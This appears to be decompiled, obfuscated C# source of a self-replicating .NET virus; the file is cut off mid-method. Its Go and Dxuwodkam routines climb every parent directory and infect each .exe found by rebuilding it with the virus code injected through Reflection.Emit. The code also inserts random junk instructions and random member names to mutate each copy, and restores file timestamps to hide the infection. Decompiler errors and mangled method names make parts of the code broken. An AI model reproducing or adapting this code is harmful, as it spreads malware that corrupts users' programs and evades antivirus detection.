using System;
using System.Collections;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Policy;
using System.Threading;
using Reflector.Disassembler;

namespace zwuUkpmiAMoxhf;

internal class lapixb
{
	private class zrrhppnseac
	{
		private Type faByPv;

		private TypeBuilder hLwbapy;

		public ArrayList ZmtahYdrlgekj;

		public ArrayList fldsCeaoUxycMb;

		public ArrayList chgzlt;

		public ArrayList Oggqplmoh;

		public ArrayList raxuojEtdz;

		public ArrayList kmvtlesig;

		public ArrayList mbGhslimc;

		public ArrayList badfllXdmn;

		public ArrayList oBzVFgfx;

		public ArrayList ybvhoeZodu;

		public zrrhppnseac()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			chgzlt = new ArrayList();
			Oggqplmoh = new ArrayList();
			ZmtahYdrlgekj = new ArrayList();
			fldsCeaoUxycMb = new ArrayList();
			mbGhslimc = new ArrayList();
			badfllXdmn = new ArrayList();
			raxuojEtdz = new ArrayList();
			kmvtlesig = new ArrayList();
			oBzVFgfx = new ArrayList();
			ybvhoeZodu = new ArrayList();
		}

		protected override void djffRfxaYiahaO()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			try
			{
				bdyxinrpumcT();
			}
			finally
			{
				base.Finalize();
			}
		}

		public void bdyxinrpumcT()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			chgzlt.Clear();
			Oggqplmoh.Clear();
			ZmtahYdrlgekj.Clear();
			fldsCeaoUxycMb.Clear();
			mbGhslimc.Clear();
			badfllXdmn.Clear();
			raxuojEtdz.Clear();
			kmvtlesig.Clear();
			oBzVFgfx.Clear();
			ybvhoeZodu.Clear();
		}

		public bool QiqslmxqMd()
		{
			return (object)faByPv == null;
		}

		public void irgCQaicaqnGx(Type intype, TypeBuilder outtype)
		{
			faByPv = intype;
			hLwbapy = outtype;
		}

		public Type wqpmeavkukqpy()
		{
			return faByPv;
		}

		public TypeBuilder eIuaThbbxh()
		{
			return hLwbapy;
		}
	}

	public class pxzcLbqGmyxaek
	{
		private ArrayList DlmnuQpdcAjua;

		public pxzcLbqGmyxaek()
		{
			DlmnuQpdcAjua = new ArrayList();
		}

		protected override void orrvtxcxw()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			try
			{
			}
			finally
			{
				base.Finalize();
			}
		}

		public void myvhvprNssji()
		{
			foreach (zrrhppnseac item in DlmnuQpdcAjua)
			{
				item.bdyxinrpumcT();
			}
			DlmnuQpdcAjua.Clear();
		}

		public void fxlyrhnrt(Type intype, TypeBuilder outtype)
		{
			zrrhppnseac zrrhppnseac = new zrrhppnseac();
			zrrhppnseac.irgCQaicaqnGx(intype, outtype);
			DlmnuQpdcAjua.Add(zrrhppnseac);
		}

		public void efPfdz(Type intype, ModuleBuilder moduleBuilder)
		{
			foreach (zrrhppnseac item in DlmnuQpdcAjua)
			{
				if (!(item.wqpmeavkukqpy().FullName == intype.FullName))
				{
					continue;
				}
				PropertyInfo[] properties = item.wqpmeavkukqpy().GetProperties(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (PropertyInfo propertyInfo in properties)
				{
					if (propertyInfo.Name == "SectionHeaders")
					{
						Console.WriteLine();
					}
					TypeBuilder typeBuilder = pucxpjpo(propertyInfo.PropertyType);
					PropertyBuilder value = (((object)typeBuilder == null) ? item.eIuaThbbxh().DefineProperty(ghlfunj(item.wqpmeavkukqpy()) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : propertyInfo.Name, propertyInfo.Attributes, propertyInfo.PropertyType, null) : item.eIuaThbbxh().DefineProperty(ghlfunj(item.wqpmeavkukqpy()) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : propertyInfo.Name, propertyInfo.Attributes, typeBuilder, null));
					item.chgzlt.Add(propertyInfo);
					item.Oggqplmoh.Add(value);
				}
				FieldInfo[] fields = item.wqpmeavkukqpy().GetFields(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (FieldInfo fieldInfo in fields)
				{
					TypeBuilder typeBuilder2 = pucxpjpo(fieldInfo.FieldType);
					FieldBuilder fieldBuilder = (((object)typeBuilder2 == null) ? item.eIuaThbbxh().DefineField(ghlfunj(item.wqpmeavkukqpy()) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : fieldInfo.Name, fieldInfo.FieldType, fieldInfo.Attributes) : item.eIuaThbbxh().DefineField(ghlfunj(item.wqpmeavkukqpy()) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : fieldInfo.Name, typeBuilder2, fieldInfo.Attributes));
					if ((object)fieldBuilder.DeclaringType!.Assembly == moduleBuilder.Assembly)
					{
						item.ZmtahYdrlgekj.Add(fieldInfo);
						item.fldsCeaoUxycMb.Add(fieldBuilder);
						continue;
					}
					throw new Exception();
				}
				ConstructorInfo[] constructors = item.wqpmeavkukqpy().GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (ConstructorInfo constructorInfo in constructors)
				{
					ParameterInfo[] parameters = constructorInfo.GetParameters();
					Type[] array = new Type[checked((uint)parameters.Length)];
					for (int l = 0; l < parameters.Length; l++)
					{
						TypeBuilder typeBuilder3 = pucxpjpo(parameters[l].ParameterType);
						if ((object)typeBuilder3 != null)
						{
							array[l] = typeBuilder3;
						}
						else
						{
							array[l] = parameters[l].ParameterType;
						}
					}
					ConstructorBuilder ctorBuilder = item.eIuaThbbxh().DefineConstructor(constructorInfo.Attributes, constructorInfo.CallingConvention, array);
					jclwzvQo(constructorInfo, ref ctorBuilder);
					item.oBzVFgfx.Add(constructorInfo);
					item.ybvhoeZodu.Add(ctorBuilder);
				}
				EventInfo[] events = item.wqpmeavkukqpy().GetEvents(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (EventInfo eventInfo in events)
				{
					EventBuilder value2 = item.eIuaThbbxh().DefineEvent(ghlfunj(item.wqpmeavkukqpy()) ? sbcjzvkbfjnuoi.tbcwkzbtonhk() : eventInfo.Name, eventInfo.Attributes, eventInfo.EventHandlerType);
					item.mbGhslimc.Add(eventInfo);
					item.badfllXdmn.Add(value2);
				}
				MethodInfo[] methods = item.wqpmeavkukqpy().GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodBase methodBase in methods)
				{
					if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(lapixb))
					{
						continue;
					}
					if (methodBase.Name == "Go")
					{
						doHuwvavrOnb = methodBase;
					}
					ParameterInfo[] parameters2 = methodBase.GetParameters();
					Type[] array2 = new Type[checked((uint)parameters2.Length)];
					for (int num = 0; num < parameters2.Length; num++)
					{
						TypeBuilder typeBuilder4 = pucxpjpo(parameters2[num].ParameterType);
						if ((object)typeBuilder4 != null)
						{
							array2[num] = typeBuilder4;
						}
						else
						{
							array2[num] = parameters2[num].ParameterType;
						}
					}
					Type returnType = ((MethodInfo)methodBase).ReturnType;
					TypeBuilder typeBuilder5 = pucxpjpo(returnType);
					string name = methodBase.Name;
					MethodBuilder methodBuilder = (((object)typeBuilder5 == null) ? item.eIuaThbbxh().DefineMethod((!ghlfunj(item.wqpmeavkukqpy()) || !(name != "Go")) ? name : sbcjzvkbfjnuoi.tbcwkzbtonhk(), methodBase.Attributes, methodBase.CallingConvention, returnType, array2) : item.eIuaThbbxh().DefineMethod((!ghlfunj(item.wqpmeavkukqpy()) || !(name != "Go")) ? name : sbcjzvkbfjnuoi.tbcwkzbtonhk(), methodBase.Attributes, methodBase.CallingConvention, typeBuilder5, array2));
					jtavbqaucxoGqk(methodBase, ref methodBuilder);
					item.kmvtlesig.Add(methodBuilder);
					item.raxuojEtdz.Add(methodBase);
				}
			}
		}

		public MethodBuilder OpjjrZFfBquC(Type type, MethodBase methodBase)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((zrrhppnseac)DlmnuQpdcAjua[num]).raxuojEtdz.Count)
				{
					MethodBase methodBase2 = (MethodBase)((zrrhppnseac)DlmnuQpdcAjua[num]).raxuojEtdz[num2];
					if (methodBase.GetHashCode() == methodBase2.GetHashCode())
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (MethodBuilder)((zrrhppnseac)DlmnuQpdcAjua[num]).kmvtlesig[num2];
		}

		public ConstructorBuilder igvsCkvbrtxgpd(Type type, ConstructorInfo ctorInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((zrrhppnseac)DlmnuQpdcAjua[num]).oBzVFgfx.Count)
				{
					ConstructorInfo constructorInfo = (ConstructorInfo)((zrrhppnseac)DlmnuQpdcAjua[num]).oBzVFgfx[num2];
					if (ctorInfo.GetHashCode() == constructorInfo.GetHashCode())
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (ConstructorBuilder)((zrrhppnseac)DlmnuQpdcAjua[num]).ybvhoeZodu[num2];
		}

		public PropertyBuilder jacaZbbgz(Type type, PropertyInfo propertyInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((zrrhppnseac)DlmnuQpdcAjua[num]).chgzlt.Count)
				{
					PropertyInfo propertyInfo2 = (PropertyInfo)((zrrhppnseac)DlmnuQpdcAjua[num]).chgzlt[num2];
					if (propertyInfo.Name == propertyInfo2.Name && (object)propertyInfo.DeclaringType == propertyInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (PropertyBuilder)((zrrhppnseac)DlmnuQpdcAjua[num]).Oggqplmoh[num2];
		}

		public FieldBuilder pdjwlfze(Type type, FieldInfo fieldInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((zrrhppnseac)DlmnuQpdcAjua[num]).ZmtahYdrlgekj.Count)
				{
					FieldInfo fieldInfo2 = (FieldInfo)((zrrhppnseac)DlmnuQpdcAjua[num]).ZmtahYdrlgekj[num2];
					if (fieldInfo.Name == fieldInfo2.Name && (object)fieldInfo.DeclaringType == fieldInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (FieldBuilder)((zrrhppnseac)DlmnuQpdcAjua[num]).fldsCeaoUxycMb[num2];
		}

		public EventBuilder ksarswaQpyRx(Type type, EventInfo eventInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((zrrhppnseac)DlmnuQpdcAjua[num]).mbGhslimc.Count)
				{
					EventInfo eventInfo2 = (EventInfo)((zrrhppnseac)DlmnuQpdcAjua[num]).mbGhslimc[num2];
					if (eventInfo.Name == eventInfo2.Name && (object)eventInfo.DeclaringType == eventInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (EventBuilder)((zrrhppnseac)DlmnuQpdcAjua[num]).badfllXdmn[num2];
		}

		public TypeBuilder pucxpjpo(Type type)
		{
			int num = 0;
			while (true)
			{
				if (num < DlmnuQpdcAjua.Count)
				{
					if (((zrrhppnseac)DlmnuQpdcAjua[num]).wqpmeavkukqpy().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			return ((zrrhppnseac)DlmnuQpdcAjua[num]).eIuaThbbxh();
		}
	}

	private class bkhltqlGjvox
	{
		private ILGenerator qzkpjgasw;

		private LocalBuilder[] xqylhaJreL;

		public bkhltqlGjvox(ILGenerator ilGenerator, LocalBuilder[] localBuilders)
		{
			qzkpjgasw = ilGenerator;
			xqylhaJreL = localBuilders;
		}

		public void eSqpqsy()
		{
			if (idvvngznumgka.Next(10) == 0)
			{
				qzkpjgasw.Emit(OpCodes.Nop);
			}
			if (idvvngznumgka.Next(20) == 0 && xqylhaJreL.Length > 0)
			{
				LocalBuilder local = xqylhaJreL[idvvngznumgka.Next(xqylhaJreL.Length)];
				qzkpjgasw.Emit(OpCodes.Ldloc, local);
				qzkpjgasw.Emit(OpCodes.Pop);
			}
		}
	}

	private sealed class AssemblyProvider : IAssemblyProvider
	{
		public Assembly[] GetAssemblies()
		{
			throw new NotImplementedException();
		}

		public Assembly Load(string assemblyName)
		{
			return Assembly.Load(assemblyName);
		}
	}

	private class bOukncg
	{
		protected int xhwqHleoQNnx;

		protected byte[] GbgccvuFkgkS = new byte[128];

		[SpecialName]
		public int vivxuclimwmaeG()
		{
			return xhwqHleoQNnx;
		}

		public void ugusxnfncbc(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			source.Read(GbgccvuFkgkS, 0, GbgccvuFkgkS.Length);
			xhwqHleoQNnx = GbgccvuFkgkS[60] | (GbgccvuFkgkS[61] << 8) | (GbgccvuFkgkS[62] << 16) | (GbgccvuFkgkS[63] << 24);
		}
	}

	private class vtimUuoda
	{
		protected byte[] woctiEonpovvve = new byte[4];

		protected ushort FgzvMs;

		protected ushort fazplng;

		protected int gPscyordwh;

		protected ushort Hnltst;

		protected ushort zaldBkxiryhha;

		protected ushort iFvhuaiz;

		protected byte cnlbuca;

		protected byte euvpPorqhjzvdU;

		protected uint FufbZn;

		protected uint xwjdvQwlxq;

		protected uint kumpHwejny;

		protected uint JDjpcxsjduuunp;

		protected uint jrzvms;

		protected uint fymajdjlltlvHl;

		protected uint rbvbaGzzhe;

		public uint aymxfxlcu;

		public uint jlnmvaHDid;

		protected ushort duinxmpvz;

		protected ushort acfpitrTJz;

		protected ushort zxOsiIf;

		protected ushort bpsFeuwma;

		protected ushort bEqxAkmq;

		protected ushort cLuTtvv;

		protected uint jHwyvfti;

		public uint PUvhlx;

		protected uint yQyNidqpzk;

		protected uint sloala;

		protected uint auepgQfrlnlNQ;

		protected uint mxdxohidl;

		protected uint iianhnbuonauG;

		protected uint fhcfwJt;

		protected uint pbfnpxkqIcl;

		protected uint kWyftlxwdqqCaY;

		protected uint reueak;

		protected tvptAvk eyslyulDr;

		protected tvptAvk dbhcscgatswc;

		public tvptAvk jjbjkethqjmz;

		protected tvptAvk JZDjyrcgg;

		protected tvptAvk vaLgsekdcrsuu;

		protected tvptAvk ndgxjagskbu;

		protected tvptAvk dpjcJbtvdjhvjd;

		protected tvptAvk sbcrcoesF;

		protected tvptAvk oxlSoGxcncpIyn;

		protected tvptAvk dDahnl;

		protected tvptAvk dvRceCnmw;

		protected tvptAvk plcwuaqrwSY;

		protected tvptAvk ybnvrw;

		protected tvptAvk stuhEmvpdrfyn;

		public tvptAvk ziuklvehg;

		public tvptAvk sgneBNjjhkn;

		public ArrayList dHnysskou;

		public byte[] iymvzvhxdMi(BinaryReader source)
		{
			try
			{
				if (jjbjkethqjmz.OzfbAk != 0)
				{
					source.BaseStream.Position = vRywlmli(jjbjkethqjmz.OzfbAk);
					return source.ReadBytes((int)jjbjkethqjmz.Pfmhoxt);
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public void vQzsqfb(BinaryReader source, bOukncg msdosheader)
		{
			source.BaseStream.Position = msdosheader.vivxuclimwmaeG();
			source.Read(woctiEonpovvve, 0, 4);
			if (woctiEonpovvve[0] == 80 && woctiEonpovvve[1] == 69 && woctiEonpovvve[2] == 0 && woctiEonpovvve[3] == 0)
			{
				FgzvMs = source.ReadUInt16();
				if (FgzvMs != 332)
				{
					throw new Exception("Incorrect machine id code");
				}
				fazplng = source.ReadUInt16();
				gPscyordwh = source.ReadInt32();
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table offset != 0");
				}
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table count != 0");
				}
				Hnltst = source.ReadUInt16();
				zaldBkxiryhha = source.ReadUInt16();
				iFvhuaiz = source.ReadUInt16();
				if (iFvhuaiz != 267)
				{
					throw new Exception("Bad magic number for PE Optional Header");
				}
				cnlbuca = source.ReadByte();
				euvpPorqhjzvdU = source.ReadByte();
				if (cnlbuca == 6 && euvpPorqhjzvdU == 0)
				{
					FufbZn = source.ReadUInt32();
					xwjdvQwlxq = source.ReadUInt32();
					kumpHwejny = source.ReadUInt32();
					JDjpcxsjduuunp = source.ReadUInt32();
					jrzvms = source.ReadUInt32();
					fymajdjlltlvHl = source.ReadUInt32();
					rbvbaGzzhe = source.ReadUInt32();
					aymxfxlcu = source.ReadUInt32();
					jlnmvaHDid = source.ReadUInt32();
					duinxmpvz = source.ReadUInt16();
					acfpitrTJz = source.ReadUInt16();
					zxOsiIf = source.ReadUInt16();
					bpsFeuwma = source.ReadUInt16();
					bEqxAkmq = source.ReadUInt16();
					cLuTtvv = source.ReadUInt16();
					source.ReadUInt32();
					PUvhlx = source.ReadUInt32();
					jHwyvfti = source.ReadUInt32();
					yQyNidqpzk = source.ReadUInt32();
					sloala = source.ReadUInt16();
					auepgQfrlnlNQ = source.ReadUInt16();
					mxdxohidl = source.ReadUInt32();
					iianhnbuonauG = source.ReadUInt32();
					fhcfwJt = source.ReadUInt32();
					pbfnpxkqIcl = source.ReadUInt32();
					kWyftlxwdqqCaY = source.ReadUInt32();
					reueak = source.ReadUInt32();
					eyslyulDr = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					dbhcscgatswc = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					jjbjkethqjmz = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					JZDjyrcgg = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					vaLgsekdcrsuu = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					ndgxjagskbu = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					dpjcJbtvdjhvjd = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					sbcrcoesF = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					oxlSoGxcncpIyn = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					dDahnl = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					dvRceCnmw = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					plcwuaqrwSY = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					ybnvrw = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					stuhEmvpdrfyn = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					ziuklvehg = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					sgneBNjjhkn = new tvptAvk(source.ReadUInt32(), source.ReadUInt32());
					dHnysskou = new ArrayList();
					for (int i = 0; i < fazplng; i++)
					{
						dHnysskou.Add(new kcXvcnrrwpqgz());
						((kcXvcnrrwpqgz)dHnysskou[i]).rusGhmQvlumtp(source);
					}
					return;
				}
				throw new Exception("Bad L number");
			}
			throw new Exception("Missing PE file signature");
		}

		public uint vRywlmli(uint rva)
		{
			int num = 0;
			while (true)
			{
				if (num < dHnysskou.Count)
				{
					if (((kcXvcnrrwpqgz)dHnysskou[num]).huMNybeUrrv <= rva && rva < ((kcXvcnrrwpqgz)dHnysskou[num]).huMNybeUrrv + ((kcXvcnrrwpqgz)dHnysskou[num]).ttireywvav)
					{
						break;
					}
					num++;
					continue;
				}
				throw new Exception("Unresolvable RVA " + rva);
			}
			return ((kcXvcnrrwpqgz)dHnysskou[num]).efxraidDxamjk + (rva - ((kcXvcnrrwpqgz)dHnysskou[num]).huMNybeUrrv);
		}
	}

	private class gxygydds : vtimUuoda
	{
		public void fcvwhfbWshwQrL(tvptAvk d, BinaryWriter dest, bOukncg msdosheader)
		{
			dest.BaseStream.Position = msdosheader.vivxuclimwmaeG() + 136;
			dest.Write(d.OzfbAk);
			dest.Write(d.Pfmhoxt);
		}

		public void hhhmxcsare(kcXvcnrrwpqgz sh, BinaryReader source, BinaryWriter dest, bOukncg msdosheader)
		{
			source.BaseStream.Position = msdosheader.vivxuclimwmaeG() + 6;
			ushort num = source.ReadUInt16();
			dest.BaseStream.Position = msdosheader.vivxuclimwmaeG() + 6;
			dest.Write(num + 1);
			dest.BaseStream.Position = msdosheader.vivxuclimwmaeG() + 248 + num * 40;
			sh.tpSchlVvwqeu(dest);
		}

		public void sBcyVrsjuhu(uint isize, BinaryWriter dest, bOukncg msdosheader)
		{
			dest.BaseStream.Position = msdosheader.vivxuclimwmaeG() + 80;
			dest.Write(isize);
		}

		public void fDqzgijCXyjmq(uint resOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			xxYrwlwunlr(resOffset, 0u, oldResRVA, newResRVA, src, dest);
		}

		private void xxYrwlwunlr(uint resOffset, uint nodeOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = resOffset + nodeOffset + 12;
			ushort num = src.ReadUInt16();
			num = (ushort)(num + src.ReadUInt16());
			for (int i = 0; i < num; i++)
			{
				src.ReadUInt32();
				uint num2 = src.ReadUInt32();
				long position = src.BaseStream.Position;
				if ((num2 & 0x80000000u) != 0)
				{
					xxYrwlwunlr(resOffset, num2 & 0x7FFFFFFFu, oldResRVA, newResRVA, src, dest);
				}
				else
				{
					jvcqYpgpskGe(resOffset + num2, oldResRVA, newResRVA, src, dest);
				}
				src.BaseStream.Position = position;
			}
		}

		private void jvcqYpgpskGe(uint dataOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = dataOffset;
			uint num = src.ReadUInt32();
			num += newResRVA;
			num -= oldResRVA;
			dest.BaseStream.Position = src.BaseStream.Position - 4L;
			dest.Write(num);
			dest.BaseStream.Position += 12L;
			src.BaseStream.Position += 12L;
		}
	}

	private class tvptAvk
	{
		public uint OzfbAk;

		public uint Pfmhoxt;

		public tvptAvk(uint rva, uint size)
		{
			OzfbAk = rva;
			Pfmhoxt = size;
		}

		public override string mxsnrsof()
		{
			return "0x" + OzfbAk.ToString("X8") + ",0x" + Pfmhoxt.ToString("X8");
		}
	}

	private class kcXvcnrrwpqgz
	{
		public byte[] Gbzzvacltssph;

		public uint ttireywvav;

		public uint huMNybeUrrv;

		public uint vWwpmibp;

		public uint efxraidDxamjk;

		protected uint wtcpyvdAquu;

		protected uint epQnvoz;

		protected ushort goebwlsq;

		protected ushort rOnzlZpa;

		public uint atacseufwU;

		public kcXvcnrrwpqgz()
		{
			rOnzlZpa = 0;
			goebwlsq = 0;
			epQnvoz = 0u;
			wtcpyvdAquu = 0u;
		}

		public kcXvcnrrwpqgz(string strname, uint vsize, uint vaddr, uint phsize, uint phoffs, uint flags)
		{
			Gbzzvacltssph = new byte[8];
			for (int i = 0; i < strname.Length && i < 8; i++)
			{
				Gbzzvacltssph[i] = (byte)strname[i];
			}
			ttireywvav = vsize;
			huMNybeUrrv = vaddr;
			vWwpmibp = phsize;
			efxraidDxamjk = phoffs;
			atacseufwU = flags;
			rOnzlZpa = 0;
			goebwlsq = 0;
			epQnvoz = 0u;
			wtcpyvdAquu = 0u;
		}

		public void tpSchlVvwqeu(BinaryWriter dest)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			dest.Write(Gbzzvacltssph, 0, 8);
			dest.Write(ttireywvav);
			dest.Write(huMNybeUrrv);
			dest.Write(vWwpmibp);
			dest.Write(efxraidDxamjk);
			dest.Write(wtcpyvdAquu);
			dest.Write(epQnvoz);
			dest.Write(goebwlsq);
			dest.Write(rOnzlZpa);
			dest.Write(atacseufwU);
		}

		public void rusGhmQvlumtp(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			Gbzzvacltssph = new byte[8];
			source.Read(Gbzzvacltssph, 0, 8);
			ttireywvav = source.ReadUInt32();
			huMNybeUrrv = source.ReadUInt32();
			vWwpmibp = source.ReadUInt32();
			efxraidDxamjk = source.ReadUInt32();
			wtcpyvdAquu = source.ReadUInt32();
			epQnvoz = source.ReadUInt32();
			goebwlsq = source.ReadUInt16();
			rOnzlZpa = source.ReadUInt16();
			atacseufwU = source.ReadUInt32();
		}
	}

	private class xkocvnL
	{
		private Random eLnfjzvLtiImkb;

		private int qxspijgsvo;

		private int zgetot;

		public xkocvnL(int len1, int len2, int seed)
		{
			eLnfjzvLtiImkb = new Random(seed);
			qxspijgsvo = len1;
			zgetot = len2;
		}

		public string tbcwkzbtonhk()
		{
			string text = "";
			int num = eLnfjzvLtiImkb.Next(qxspijgsvo, zgetot);
			for (int i = 0; i < num; i++)
			{
				text = ((eLnfjzvLtiImkb.Next(8) != 1) ? (text + (char)(97 + eLnfjzvLtiImkb.Next(26))) : (text + (char)(65 + eLnfjzvLtiImkb.Next(26))));
			}
			return text;
		}
	}

	private static xkocvnL sbcjzvkbfjnuoi = new xkocvnL(6, 15, Environment.TickCount);

	private static Random idvvngznumgka = new Random(Environment.TickCount);

	private static byte[] qxdznhgU;

	private static MethodBase doHuwvavrOnb;

	public static bool angmrruuqmQqbb;

	public lapixb(string inFileName, string outFileName)
	{
		try
		{
			angmrruuqmQqbb = true;
			qLjThuTb(inFileName, outFileName);
			if (!angmrruuqmQqbb)
			{
				qLjThuTb(inFileName, outFileName);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool ghlfunj(Type t)
	{
		return (object)t.Assembly == Assembly.GetExecutingAssembly() && -1 == t.FullName!.IndexOf("AssemblyProvider");
	}

	public static void Go()
	{
		qxdznhgU = gcpVoenwxmnp();
		string currentDirectory;
		do
		{
			Dxuwodkam();
			currentDirectory = Directory.GetCurrentDirectory();
			Directory.SetCurrentDirectory("..");
		}
		while (currentDirectory != Directory.GetCurrentDirectory());
	}

	public static void Dxuwodkam()
	{
		string[] files = Directory.GetFiles(".", "*.exe");
		if (files.Length == 0)
		{
			return;
		}
		bool flag;
		if (!(flag = File.Exists("ILReader.dll")) && qxdznhgU != null)
		{
			FileStream fileStream = new FileStream("ILReader.dll", FileMode.CreateNew, FileAccess.ReadWrite);
			if (fileStream != null)
			{
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				binaryWriter.Write(qxdznhgU);
			}
			fileStream.Close();
		}
		string[] array = files;
		foreach (string path in array)
		{
			string fileName = Path.GetFileName(path);
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
			string text = "_" + fileName;
			if (fileName[0] == '_' || fileNameWithoutExtension == Assembly.GetExecutingAssembly().GetName().Name || File.Exists(text))
			{
				continue;
			}
			DateTime creationTime = File.GetCreationTime(fileName);
			DateTime lastAccessTime = File.GetLastAccessTime(fileName);
			DateTime lastWriteTime = File.GetLastWriteTime(fileName);
			File.Move(fileName, text);
			try
			{
				object[] array2 = new object[2] { text, fileName };
				AppDomain appDomain = AppDomain.CreateDomain("domain");
				Type typeFromHandle = typeof(lapixb);
				string name = Assembly.GetExecutingAssembly().GetName().Name;
				appDomain.CreateInstance(name, typeFromHandle.FullName, false, BindingFlags.Default, (Binder)null, array2, (CultureInfo)null, (object[])null, (Evidence)null);
				AppDomain.Unload(appDomain);
				if (File.Exists(fileName))
				{
					File.Delete(text);
					oswdhvvoxThrks(fileName, qxdznhgU);
					File.SetCreationTime(fileName, creationTime);
					File.SetLastAccessTime(fileName, lastAccessTime);
					File.SetLastWriteTime(fileName, lastWriteTime);
					string path2 = fileNameWithoutExtension + ".resources";
					if (File.Exists(path2))
					{
						File.SetCreationTime(path2, creationTime);
						File.SetLastAccessTime(path2, lastAccessTime);
						File.SetLastWriteTime(path2, lastWriteTime);
					}
				}
				else
				{
					File.Move(text, fileName);
				}
			}
			catch (ThreadAbortException)
			{
				File.Move(text, fileName);
			}
			catch (Exception)
			{
			}
		}
		if (!flag)
		{
			File.Delete("ILReader.dll");
		}
	}

	private static PEFileKinds ljIpwyhM(string filename)
	{
		FileStream fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read);
		if (fileStream == null)
		{
			return (PEFileKinds)0;
		}
		byte[] array = new byte[4];
		fileStream.Seek(60L, SeekOrigin.Begin);
		fileStream.Read(array, 0, 4);
		uint num = array[0] | ((uint)array[1] >> 8) | ((uint)array[2] >> 16) | ((uint)array[3] >> 24);
		fileStream.Seek(num + 92, SeekOrigin.Begin);
		fileStream.Read(array, 0, 1);
		fileStream.Close();
		if (array[0] == 3)
		{
			return PEFileKinds.ConsoleApplication;
		}
		return PEFileKinds.WindowApplication;
	}

	public static void qLjThuTb(string inFileName, string outFileName)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		PEFileKinds filetype = ljIpwyhM(inFileName);
